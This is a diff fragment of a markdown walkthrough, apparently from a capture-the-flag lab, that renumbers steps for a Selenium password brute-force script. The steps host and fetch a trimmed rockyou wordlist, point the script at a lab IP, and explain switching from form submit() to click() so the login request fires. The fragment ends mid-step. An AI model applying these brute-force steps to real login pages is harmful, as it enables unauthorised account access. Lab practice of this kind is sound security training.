@@ -29,24 +29,24 @@ cd /tmp
 python3 -m http.server  
 ```
  
-5) Back on the Custom Tooling box download the list, 
+6) Back on the Custom Tooling box download the list, 
 ```
 cd ~/Desktop/101Selenium/
 wget http://<<attackboxip>>:8000/rock100.txt
 ```
 
-6) Now for the fun stuff, edit our apocalypse.py
+7) Now for the fun stuff, edit our apocalypse.py
 
 ```
 nano ~/Desktop/101Selenium/apocalypse.py
 ```
 
-7) On the script update the ip to match the target ip
+8) On the script update the ip to match the target ip
 ```
 ip = 'http://10.49.147.106'
 ```
 
-8) Replace
+9) Replace
 ```
 passwords = ["123456", "admin", "letmein", "password123", "password"]
 ```
@@ -57,7 +57,7 @@ with our trimmed rock you
 passwords = [p.rstrip() for p in open("~/Desktop/101Selenium/rock100.txt")]
 ```
 
-9) If we run the script now, it will seem to work but never finds the login. What i found you have to update 
+10) If we run the script now, it will seem to work but never finds the login. What i found you have to update 
 
 ```
         chrome.find_element(By.TAG_NAME, "form").submit()
@@ -75,7 +75,7 @@ Why you ask,
 - `click()` triggers the **button click event**, so any JavaScript (`fetch`, `xhr`, `form handler`) attached to it will run and this challenge runs a login() javascript, so now correctly gets sent by post.  
 
 
-10) Now save and run your python with
+11) Now save and run your python with
 
 ```
 cd ~/Desktop/101Selenium/
